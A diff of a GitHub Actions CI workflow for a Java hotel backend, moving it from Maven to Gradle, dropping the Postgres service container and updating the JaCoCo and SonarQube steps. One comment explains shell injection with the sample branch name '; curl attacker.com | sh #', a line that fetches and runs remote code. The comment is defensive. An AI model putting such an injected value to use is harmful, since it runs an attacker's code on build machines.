@@ -3,7 +3,7 @@
 # Runs on: every push to any branch + every pull request
 #
 # Jobs:
-#   test           → compile, unit tests, JaCoCo coverage
+#   test           → compile, unit + integration tests, JaCoCo coverage
 #   sonar          → SonarQube analysis (needs test to finish first)
 #   frontend-check → nginx.conf validation
 #
@@ -34,7 +34,6 @@ concurrency:
 env:
   JAVA_VERSION: "25"
   JAVA_DISTRIBUTION: "liberica"       # Liberica NIK — GraalVM-based, best Spring Boot native support
-  MAVEN_OPTS: "-Xmx2048m"
 
 jobs:
   # ─────────────────────────────────────────────────────────────
@@ -49,24 +48,6 @@ jobs:
       checks: write         # EnricoMi/publish-unit-test-result-action → create check run
       pull-requests: write  # EnricoMi/publish-unit-test-result-action → PR comment
 
-    # Service container: PostgreSQL for integration tests.
-    # Unit tests (domain + application + web slice) don't need this.
-    # Only @Tag("integration") tests in bootstrap/ use it.
-    services:
-      postgres:
-        image: postgres:17-alpine
-        env:
-          POSTGRES_DB: hotel_db_test
-          POSTGRES_USER: hotel_user
-          POSTGRES_PASSWORD: testpassword
-        ports:
-          - 5432:5432
-        options: >-
-          --health-cmd "pg_isready -U hotel_user -d hotel_db_test"
-          --health-interval 10s
-          --health-timeout 5s
-          --health-retries 5
-
     steps:
       - name: Checkout
         uses: actions/checkout@v6
@@ -80,34 +61,22 @@ jobs:
           java-version: ${{ env.JAVA_VERSION }}
           distribution: ${{ env.JAVA_DISTRIBUTION }}
 
-      # Cache Maven dependencies — dramatically speeds up subsequent runs
-      - name: Cache Maven packages
-        uses: actions/cache@v5
-        with:
-          path: ~/.m2/repository
-          key: maven-${{ runner.os }}-${{ hashFiles('hotel-backend/**/pom.xml') }}
-          restore-keys: |
-            maven-${{ runner.os }}-
+      # Gradle wrapper validation + dependency/build caching.
+      - name: Set up Gradle
+        uses: gradle/actions/setup-gradle@v4
 
-      # Unit tests only — fast, no DB needed.
-      # Integration tests (@Tag("integration")) are excluded here and
-      # run separately to keep CI fast. The postgres service above is
-      # ready for when integration tests are added.
-      - name: Run unit tests with coverage
+      # Full build: compile, unit + Testcontainers integration tests, JaCoCo.
+      # Docker is available on ubuntu-latest, so Testcontainers works directly.
+      - name: Build, test & coverage
         working-directory: hotel-backend
-        run: |
-          mvn clean verify -Pcoverage \
-            --batch-mode \
-            --no-transfer-progress \
-            -Dgroups='!integration' \
-            -Dspring.profiles.active=test
+        run: ./gradlew build --no-daemon
 
-      # Upload coverage report for the SonarQube job to consume
-      - name: Upload JaCoCo aggregate report
+      # Upload per-module JaCoCo XML reports for the SonarQube job to consume.
+      - name: Upload JaCoCo reports
         uses: actions/upload-artifact@v7
         with:
           name: jacoco-report
-          path: hotel-backend/coverage-aggregate/target/site/jacoco-aggregate/
+          path: hotel-backend/**/build/reports/jacoco/test/jacocoTestReport.xml
           retention-days: 1
 
       # Publish test results as a summary visible in the PR checks UI
@@ -115,7 +84,7 @@ jobs:
         uses: EnricoMi/publish-unit-test-result-action@v2
         if: always()
         with:
-          files: "hotel-backend/**/target/surefire-reports/*.xml"
+          files: "hotel-backend/**/build/test-results/test/*.xml"
 
   # ─────────────────────────────────────────────────────────────
   # JOB 2: SonarQube Analysis
@@ -123,7 +92,7 @@ jobs:
   sonar:
     name: "Backend — SonarQube Analysis"
     runs-on: ubuntu-latest
-    needs: test    # must have coverage report first
+    needs: test    # must have a green build first
     if: |
       github.event_name == 'push' ||
       (github.event_name == 'pull_request' && github.event.pull_request.head.repo.full_name == github.repository)
@@ -140,33 +109,8 @@ jobs:
           java-version: ${{ env.JAVA_VERSION }}
           distribution: ${{ env.JAVA_DISTRIBUTION }}
 
-      - name: Cache Maven packages
-        uses: actions/cache@v5
-        with:
-          path: ~/.m2/repository
-          key: maven-${{ runner.os }}-${{ hashFiles('hotel-backend/**/pom.xml') }}
-          restore-keys: |
-            maven-${{ runner.os }}-
-
-      # Restore coverage report produced by the test job
-      - name: Download JaCoCo report
-        uses: actions/download-artifact@v8
-        with:
-          name: jacoco-report
-          path: hotel-backend/coverage-aggregate/target/site/jacoco-aggregate/
-
-      # Cache SonarQube scanner — avoids re-downloading on every run
-      - name: Cache SonarQube scanner
-        uses: actions/cache@v5
-        with:
-          path: ~/.sonar/cache
-          key: sonar-${{ runner.os }}
-          restore-keys: sonar-${{ runner.os }}
-
-      # Compile first — Sonar needs bytecode for its analysis
-      - name: Compile (needed for Sonar bytecode analysis)
-        working-directory: hotel-backend
-        run: mvn compile --batch-mode --no-transfer-progress
+      - name: Set up Gradle
+        uses: gradle/actions/setup-gradle@v4
 
       # Skip analysis entirely when SONAR_HOST_URL is not configured.
       # This prevents a misleading "URI with undefined scheme" failure on
@@ -178,7 +122,7 @@ jobs:
       # a branch name like "; curl attacker.com | sh #" would execute as shell
       # code if substituted literally. Environment variables are passed as data
       # and are never interpreted as shell syntax.
-      - name: Run SonarQube analysis
+      - name: Run tests + SonarQube analysis
         if: ${{ secrets.SONAR_HOST_URL != '' }}
         working-directory: hotel-backend
         env:
@@ -195,8 +139,7 @@ jobs:
         run: |
           # Pull-request analysis: decorate the PR with inline findings.
           # Branch analysis: track the branch over time (SonarQube Developer+
-          # or SonarCloud required for branch analysis; Community Edition only
-          # supports the main branch).
+          # or SonarCloud required; Community Edition only supports main).
           if [[ "$GH_EVENT_NAME" == "pull_request" ]]; then
             SONAR_EXTRA_ARGS="\
               -Dsonar.pullrequest.key=$GH_PR_NUMBER \
@@ -206,9 +149,7 @@ jobs:
             SONAR_EXTRA_ARGS="-Dsonar.branch.name=$GH_REF_NAME"
           fi
 
-          mvn sonar:sonar -Psonar \
-            --batch-mode \
-            --no-transfer-progress \
+          ./gradlew build sonar --no-daemon \
             -Dsonar.host.url="$SONAR_HOST_URL" \
             -Dsonar.token="$SONAR_TOKEN" \
             -Dsonar.scm.revision="$GH_SHA" \
